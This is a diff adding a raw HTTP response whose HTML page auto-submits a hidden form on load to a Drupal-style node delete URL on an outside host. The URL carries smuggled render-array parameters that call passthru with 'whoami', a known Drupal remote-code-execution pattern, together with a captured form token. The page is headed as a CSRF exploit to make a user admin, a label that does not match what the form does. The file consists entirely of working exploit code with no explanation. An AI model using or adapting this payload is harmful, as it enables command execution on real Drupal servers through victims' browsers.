@@ -1,0 +1,15 @@
+HTTP/1.1 200 OK
+Content-Length: 539
+Content-Type: text/html
+
+
+<html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit change user to admin</H2>
+ <form method="POST" name="form0" action="http://vps595401.ovh.net:36823/node/2/delete&destination=node?q[%2523][]=passthru%26q[%2523type]=markup%26q[%2523markup]=whoami">
+ <input type="hidden" name="form_id" value="node_delete_confirm"/>
+ <input type="hidden" name="_triggering_element_name" value="form_id"/>
+ <input type="hidden" name="form_token" value="dEZVoRSK_txp3tV-hakLCagk_MhuyoCpbZBAWWxg_wA"/>
+ </form>
+ </body>
+ </html>
